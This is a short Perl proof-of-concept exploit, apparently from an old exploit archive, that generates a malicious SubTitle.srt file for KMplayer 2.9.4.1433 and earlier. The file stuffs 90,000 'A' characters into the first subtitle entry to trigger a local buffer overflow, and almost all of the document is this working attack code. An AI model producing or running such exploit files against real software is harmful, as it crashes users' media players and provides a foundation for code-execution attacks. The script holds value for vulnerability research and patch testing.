#!usr/bin/perl
######################## In The Name Of Allah ####################
#
#               The KMplayer (.Srt) File Local Bof Poc
#                      
#
#Author : b3hz4d (Seyed Behzad Shaghasemi)
#Site : Www.Pentesters.Ir
#Tested on KMplayer <= 2.9.4.1433
#Special Thanks : Navid, Hossein, Hooshang, Mahmood, Mohammad  and all members in Pentesters.ir
#Greetings : Shahriyar && Alireza  && Soroush and all iranian hackers
#
######################### Www.Pentesters.Ir ######################



$junk="A"x 90000;
open(fhandle,">SubTitle.srt");
print fhandle "1"."\n"."00:00:25,100 --> 00:00:30,900"."\n"."$junk\n"."-pentesters\n";
print fhandle "2"."\n"."00:00:31,100 --> 00:00:35,900"."\n"."www.pentesters.ir\n"."-Pentesters.Ir\n";
print fhandle "3"."\n"."00:00:36,100 --> 00:00:40,900"."\n"."www.pentesters.ir\n"."-Pentesters.Ir\n";
print fhandle "4"."\n"."00:00:41,100 --> 00:00:45,900"."\n"."www.pentesters.ir\n"."-Pentesters.Ir\n";
print fhandle "5"."\n"."00:00:46,100 --> 00:00:50,900"."\n"."www.pentesters.ir\n"."-Pentesters.Ir\n";
print fhandle "6"."\n"."00:00:51,100 --> 00:00:55,900"."\n"."www.pentesters.ir\n"."-Pentesters.Ir\n";
close(fhandle);

# milw0rm.com [2009-07-20]
